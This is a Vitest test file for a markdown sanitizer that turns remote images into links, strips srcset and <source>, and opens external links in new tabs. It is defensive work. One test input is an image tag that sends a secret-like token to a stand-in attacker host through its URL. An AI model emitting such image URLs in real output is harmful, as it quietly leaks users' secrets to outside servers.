// @vitest-environment happy-dom
import { describe, expect, it } from "vitest";
import { externalLinksInNewTab, neutralizeExternalImages, renderMarkdown } from "./markdown";

describe("neutralizeExternalImages", () => {
  it("turns remote images into links so nothing is fetched", () => {
    const out = neutralizeExternalImages('<p>x <img src="https://attacker.example/log?secret=AKIA" alt="図"></p>');
    expect(out).not.toContain("<img");
    expect(out).toContain('href="https://attacker.example/log?secret=AKIA"');
    expect(out).toContain('rel="noopener noreferrer"');
    expect(out).toContain("画像: 図");
  });

  it("treats http, protocol-relative and other schemes as remote", () => {
    for (const src of ["http://a.example/i.png", "//cdn.example/i.png", "ftp://a.example/i.png"]) {
      expect(neutralizeExternalImages(`<img src="${src}">`), src).not.toContain("<img");
    }
  });

  it("keeps same-origin and inline images", () => {
    const same = '<img src="/api/fs/download?path=%2Fa.png&amp;inline=1">';
    expect(neutralizeExternalImages(same)).toContain("<img");
    expect(neutralizeExternalImages('<img src="data:image/png;base64,AAAA">')).toContain("<img");
    expect(neutralizeExternalImages('<img src="rel/pic.png">')).toContain("<img");
  });

  it("drops srcset and <source>, which can carry remote URLs", () => {
    const out = neutralizeExternalImages(
      '<picture><source srcset="https://x.example/a.png"><img src="/ok.png" srcset="https://x.example/b.png 2x"></picture>',
    );
    expect(out).not.toContain("x.example");
    expect(out).toContain('src="/ok.png"');
  });
});

describe("externalLinksInNewTab", () => {
  it("opens links to other sites in a new tab without an opener", () => {
    for (const href of ["https://example.com/a", "http://example.com", "//cdn.example/x", "mailto:a@example.com"]) {
      const out = externalLinksInNewTab(`<p><a href="${href}">x</a></p>`);
      expect(out, href).toContain('target="_blank"');
      expect(out, href).toContain('rel="noopener noreferrer"');
    }
  });

  it("leaves in-page and same-origin links alone", () => {
    for (const html of [
      '<a href="#">x</a>',
      '<a class="file-link" href="#" data-path="/a.md">a.md</a>',
      '<a href="/api/fs/download?path=%2Fa">x</a>',
      '<a href="docs/a.md">x</a>',
      "<a>no href</a>",
    ]) {
      expect(externalLinksInNewTab(html), html).not.toContain("target=");
    }
  });
});

describe("renderMarkdown", () => {
  it("renders links from replies so they open in a new tab", () => {
    const out = renderMarkdown("詳しくは[公式](https://example.com/docs)と<https://example.org>を参照");
    expect(out.match(/target="_blank"/g)).toHaveLength(2);
    expect(out.match(/rel="noopener noreferrer"/g)).toHaveLength(2);
  });
});
